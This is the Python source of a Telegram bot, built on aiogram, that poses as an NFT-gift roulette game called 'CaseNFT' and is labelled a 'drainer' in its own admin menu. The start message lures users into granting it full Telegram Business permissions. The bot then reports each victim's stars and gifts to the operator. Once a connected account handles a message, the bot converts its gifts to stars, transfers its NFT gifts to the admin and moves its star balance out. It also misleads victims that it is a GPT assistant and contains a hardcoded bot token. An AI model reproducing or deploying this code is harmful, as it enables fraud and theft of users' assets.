import asyncio
import datetime
import time
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram import F
from aiogram import Bot, Dispatcher
from aiogram import types
import asyncio
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars, UpgradeGift
from aiogram.types import InputMediaPhoto
import asyncio
import datetime
import time
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.filters import CommandStart
from aiogram.exceptions import TelegramBadRequest
import os
import sys
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
import asyncio
from aiogram.types import InputMediaPhoto
import re
import random
import asyncio
from aiosend import CryptoPay, MAINNET
import sqlite3
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime
import pytz
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F
import asyncio
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.fsm.context import FSMContext
from aiogram.filters import Command, CommandStart
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice, Message
from aiogram.utils.keyboard import  InlineKeyboardBuilder
from aiosend import CryptoPay
from aiogram import F
import asyncio
import logging
import aiohttp
import sys
import asyncio
from contextlib import suppress
import logging
import sys
import os
from os import getenv
import sqlite3
import random
import re
import datetime
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
import time
from aiogram.exceptions import TelegramBadRequest
from typing import Any
from aiogram import types
from aiogram import Router
from aiogram import Bot, Dispatcher, F   
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.types import Message, CallbackQuery
from aiogram.types import PreCheckoutQuery, LabeledPrice
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton , InlineKeyboardMarkup , InlineKeyboardButton , CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode
from datetime import datetime, timedelta
from aiogram.types import ChatPermissions
from aiogram.enums import ChatType
from aiogram.methods.send_gift import SendGift
import asyncio
from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import Message
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application




import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re
from aiogram import F
from aiogram.filters import Command

import os

BOT_TOKEN = os.getenv("BOT_TOKEN") 

TOKEN = "8159810912:AAH_i-oELMlsVC-3jwecPzDg1g9N5tSsQqU"
ADMIN_ID = 767154085
bot = Bot(TOKEN)

dp = Dispatcher()

WEB_SERVER_HOST = "0.0.0.0"  
WEB_SERVER_PORT = int(os.getenv("PORT", 8080)) 
WEBHOOK_PATH = "/webhook"
BASE_WEBHOOK_URL = os.getenv("WEBHOOK_URL")


if not BOT_TOKEN:
    logging.error("‚ùå –û–®–ò–ë–ö–ê: –ù–µ —É–∫–∞–∑–∞–Ω BOT_TOKEN –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è!")
    sys.exit(1)

  





async def on_startup():
    """–î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞"""
    try:
        if BASE_WEBHOOK_URL:
            await bot.set_webhook(
                f"{BASE_WEBHOOK_URL}{WEBHOOK_PATH}",
                drop_pending_updates=True
            )
        await bot.send_message(ADMIN_ID, "–ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!")
    except Exception as e:
        logging.error(f"üö® –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ: {e}")
        raise

async def on_shutdown():
    """–î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏ –±–æ—Ç–∞"""
    try:
        if BASE_WEBHOOK_URL:
            await bot.delete_webhook()
        await bot.send_message(ADMIN_ID, "–ë–æ—Ç –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
        await bot.session.close()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏: {e}")

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{BASE_WEBHOOK_URL or 'http://localhost'}/ping") as resp:
                    logging.info(f"Keep-alive ping: {resp.status}")
        except Exception as e:
            logging.error(f"Keep-alive error: {e}")
        await asyncio.sleep(300)

async def ping_handler(request: web.Request):
    return web.Response(text="Bot is alive")

async def setup_webhook():
    """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –≤–µ–±—Ö—É–∫–∞"""
    app = web.Application()
    app.router.add_get("/ping", ping_handler)
    
    webhook_requests_handler = SimpleRequestHandler(
        dispatcher=dp,
        bot=bot,
    )
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)
    
    return app



from aiogram.methods.base import TelegramMethod
from typing import List
from pydantic import BaseModel, Field

class StarAmount(BaseModel):
    star_amount: int = Field(..., alias="amount")

class Gift(BaseModel):
    id: str
    title: str
    count: int

class GiftList(BaseModel):
    gifts: List[Gift]

class GetFixedBusinessAccountStarBalance(TelegramMethod[StarAmount]):
    __returning__ = StarAmount
    __api_method__ = "getBusinessAccountStarBalance"

    business_connection_id: str

class GetFixedBusinessAccountGifts(TelegramMethod[GiftList]):
    __returning__ = GiftList
    __api_method__ = "getBusinessAccountGifts"

    business_connection_id: str

class TransferGift(TelegramMethod[bool]):
    __returning__ = bool
    __api_method__ = "transferGift"

    business_connection_id: str
    gift_id: str
    receiver_user_id: int




@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    try:
        command_args = message.text.split()
        if len(command_args) != 2:
            await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ id –æ–ø–µ—Ä–∞—Ü–∏–∏. –ü—Ä–∏–º–µ—Ä: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"–í–æ–∑–≤—Ä–∞—Ç –∑–≤—ë–∑–¥ –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id} —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!")
        else:
            await message.answer(f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤–æ–∑–≤—Ä–∞—Ç –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id}.")

    except Exception as e:
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞: {str(e)}")


builder = InlineKeyboardBuilder()
builder.button(text="‚öôÔ∏è –û—Ç–∫—Ä—ã—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram", url="tg://settings")
builder.button(text="üîó –î–æ–±–∞–≤–∏—Ç—å –≤ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç", url=f"tg://resolve?domain=CaseNftGameBot&start=business")




@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        activation_text = f"""
<b>üî∏ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {message.from_user.full_name}! CaseNFT ‚Äî –ª—É—á—à–∞—è —Ä—É–ª–µ—Ç–∫–∞ –Ω—Ñ—Ç-–ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –¢–µ–ª–µ–≥—Ä–∞–º!
–î–∞–Ω–Ω—ã–π –±–æ—Ç –¥–∞–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤—ã–∏–≥—Ä–∞—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ –¥–æ—Ä–æ–≥–∏—Ö –Ω—Ñ—Ç-–ø–æ–¥–∞—Ä–∫–æ–≤</b>

<b>üî∏ –î–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã –≤—ã–ø–æ–ª–Ω–∏—Ç–µ —à–∞–≥–∏:</b>
<blockquote><i> [1] –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram.
 [2] –û—Ç–∫—Ä–æ–π—Ç–µ —Ä–∞–∑–¥–µ–ª Telegram Business.
 [3] –ù–∞–∂–º–∏—Ç–µ '–ë–æ—Ç—ã –¥–ª—è –±–∏–∑–Ω–µ—Å–∞'.
 [4] –î–æ–±–∞–≤—å—Ç–µ –±–æ—Ç–∞ , –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–≤ –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è</i></blockquote>

<b>üî∏ –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –≤–∞–º –±—É–¥–µ—Ç –Ω–∞—á–∏—Å–ª–µ–Ω–æ <u>5 –∫—Ä—É—Ç–æ–∫</u>. –£–¥–∞—á–Ω–æ–π –∏–≥—Ä—ã, –ø—Ä–∏—è—Ç–µ–ª—å!</b>
"""

        photo_url = 'https://i.postimg.cc/nLNQ5p0k/a8dea961-3ac5-494a-a459-abd5fa948690.png' 

        await message.answer_photo(
    photo=photo_url,
    caption=activation_text,
    reply_markup=builder.as_markup(),
    parse_mode='HTML'
)
    else:
        await message.answer(
            f"""–î—Ä–µ–π–Ω–µ—Äüîó
            
/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã
/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã
/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é
/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã"""
        )





CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = ADMIN_ID  # –ü—Ä–æ—Å—Ç–æ –æ–¥–∏–Ω ID

        rights = connection.rights
        business_connection = connection

        rights_text = "\n".join([
            f"üìç <b>–ü—Ä–∞–≤–∞ –±–æ—Ç–∞:</b>",
            f"‚ñ´Ô∏è –ß—Ç–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_read_messages else '‚ùå'}",
            f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_all_messages else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–º–µ–Ω–∏: {'‚úÖ' if rights.can_edit_name else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–ø–∏—Å–∞–Ω–∏—è: {'‚úÖ' if rights.can_edit_bio else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–æ—Ç–æ –ø—Ä–æ—Ñ–∏–ª—è: {'‚úÖ' if rights.can_edit_profile_photo else '‚ùå'}",
            f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ username: {'‚úÖ' if rights.can_edit_username else '‚ùå'}",
            f"‚ñ´Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_change_gift_settings else '‚ùå'}",
            f"‚ñ´Ô∏è –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_view_gifts_and_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞/—É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_transfer_and_upgrade_gifts else '‚ùå'}",
            f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_transfer_stars else '‚ùå'}",
            f"‚ñ´Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏—è–º–∏: {'‚úÖ' if rights.can_manage_stories else '‚ùå'}",
            f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_sent_messages else '‚ùå'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if gift.type == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"

        msg = (
            f"ü§ñ <b>–ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{business_connection.user.username or '‚Äî'}\n"
            f"üÜî User ID: <code>{business_connection.user.id}</code>\n"
            f"üîó Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: <code>{star_amount_text}</code>"
            f"\nüéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: <code>{all_gifts_text}</code>"
            f"\nüîù NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ (–∏ –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"üîù –ê–ø–≥—Ä–µ–π–¥–Ω—É—Ç—å –≤—Å–µ –≥–∏—Ñ—Ç—ã", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")
def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
        else:
            for gift in gifts.gifts:
                if gift.owned_gift_id == owned_gift_id:
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
    except Exception as e:
        return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."


@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞. –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤ –ª—é–±–æ–º –ª–∏—á–Ω–æ–º —á–∞—Ç–µ '.gpt –∑–∞–ø—Ä–æ—Å'")
        save_business_connection_data(business_connection)
        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except:
        pass
        
from aiogram import types
from aiogram.filters import Command

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id

    if user_id == OWNER_ID:
        return

  
    try:
        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = gift.owned_gift_id
                await bot.convert_gift_to_stars(business_id, owned_gift_id)
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–∞ {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("–ù–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = gift.owned_gift_id
                await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
                print(f"–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫ {owned_gift_id} –Ω–∞ task_id {task_id}")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞ {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if stars.amount > 0:
            print(f"–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {stars.amount} –∑–≤—ë–∑–¥")
            await bot.transfer_business_account_stars(business_id, int(stars.amount))
        else:
            print("–ù–µ—Ç –∑–≤—ë–∑–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –±–∞–ª–∞–Ω—Å–æ–º –∑–≤—ë–∑–¥: {e}")

from aiogram import Bot
from aiogram.types import MenuButtonWebApp, WebAppInfo\
    

async def setup_menu_button():
    await bot.set_chat_menu_button(
        menu_button=MenuButtonWebApp(
            text="–°–∞–π—Ç",
            web_app=WebAppInfo(url="https://casenft.vercel.app")
        )
    )


# ===== –ó–ê–ü–£–°–ö –ë–û–¢–ê =====
async def main():
    try:
        # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞
        await setup_menu_button()
        app = await setup_webhook()
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(
            runner,
            host=WEB_SERVER_HOST,
            port=WEB_SERVER_PORT,
            reuse_port=True
        )
        
        await site.start()
        logging.info(f"üåê –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É {WEB_SERVER_PORT}")
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞
        await on_startup()
        asyncio.create_task(keep_alive())
        
        # –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª
        while True:
            await asyncio.sleep(3600)
            
    except (KeyboardInterrupt, SystemExit):
        logging.info("üõë –ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        logging.critical(f"üí• –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
    finally:
        await on_shutdown()
        if 'runner' in locals():
            await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logging.critical(f"üí• –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞: {e}")
        sys.exit(1)
